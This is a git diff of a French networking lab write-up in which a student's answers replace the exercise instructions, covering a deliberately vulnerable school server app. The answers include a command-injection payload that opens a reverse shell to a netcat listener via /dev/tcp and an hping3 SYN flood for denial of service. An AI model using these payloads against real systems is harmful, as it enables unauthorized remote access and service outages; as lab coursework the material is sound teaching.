@@ -28,54 +28,48 @@
 
 🌞 **Prouvez que l'application écoute sur l'IP que vous avez spécifiée**
 
-- profitez-en pour repérer le port TCP sur lequel écoute l'application
-- ça se fait en une seule commande `ss`
-- filtrez la sortie de la commande avec un `| grep` pour mettre en évidence la ligne intéressante dans le compte-rendu
+```bash
+[toto@rocky ~]$ sudo ss -ltnp
+State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process                                 
+LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*           users:(("sshd",pid=843,fd=3))          
+LISTEN       0            100                172.16.74.175:8888                   0.0.0.0:*           users:(("python",pid=5522,fd=6))
+```
 
 ## 2. Prêts
 
 🌞 **Se connecter à l'application depuis votre PC**
 
-- depuis votre PC ! (pas depuis une VM)
-- depuis votre PC, utilisez une commande `nc` (netcat) pour vous connecter à l'application
-  - il faudra l'installer si vous ne l'avez pas sur votre PC :)
-- il faudra ouvrir un port firewall sur la VM (celui sur lequel écoute `efrei_server`, que vous avez repéré à l'étape précédente) pour qu'un client puisse se connecter
-
 ```bash
-# avec netcat, vous pourrez vous connecter en saissant :
-nc <IP> <PORT>
+nc 172.16.74.175 8888 
 ```
 
 ## 3. Hackez
 
 🌞 **Euh bah... hackez l'application !**
 
-- elle est vulnérable
-- c'est un cas d'école, je pense que ça prendra pas longtemps à la plupart d'entre vous :d
-- bref, en tant que clients, vous pouvez avoir un shell sur la machine serveur, et exécuter des commandes
+*Dans un premier shell*
+```bash
+nc -nvl 8080
+```
 
-> N'hésitez pas à me demander de l'aide pour cette section si c'est po clair ni intuitif pour vous.
+*Dans un second shell*
+
+```bash
+❯ nc 172.16.74.175 8888
+Hello ! Tu veux des infos sur quoi ?
+1) cpu
+2) ram
+3) disk
+4) ls un dossier
+
+Ton choix (1, 2, 3 ou 4) : 4
+Exécuter la commande ls vers le dossier : ; sh -i >& /dev/tcp/172.16.74.1/8080 0>&1
+```
 
 🌟 **BONUS : DOS l'application**
 
-- il faut rendre l'application inopérante
-- pour être précis, un DOS ici, c'est qu'aucun autre client ne doit pouvoir se connecter
-- utilisez un autre vecteur que la vulnérabilité précédente pour provoquer le DOS
-
-![Hac](./img/hac.png)
-
----
-
-➜ **BON** on a une application qui tourne sur une machine Linux, à l'arrache.  
-**Nos dévs sont nuls, l'app est vulnérable.** 🙃
-
-> *ui c moa le dév é alor ?!*
-
-Dans le reste du TP, **on va continuer à bosser sur l'hébergement mais en sachant ça : l'app est vulnérable.**  
-Notre but va donc être de proposer l'hébergement de cette application vulnérable, mais en **minimisant l'impact de cette vulnérabilité** le plus possible.
-
-➜ **Comment héberger une application vulnérable et dormir (à peu près) sur ses deux oreilles ?**
-
-> *Bonne question Jamy ! Continuons le TP :d*
+```bash
+sudo hping3 --flood -p 8888 -S 172.16.74.175
+```
 
 > ➜ [**Lien vers la partie 2**](./part2.md)
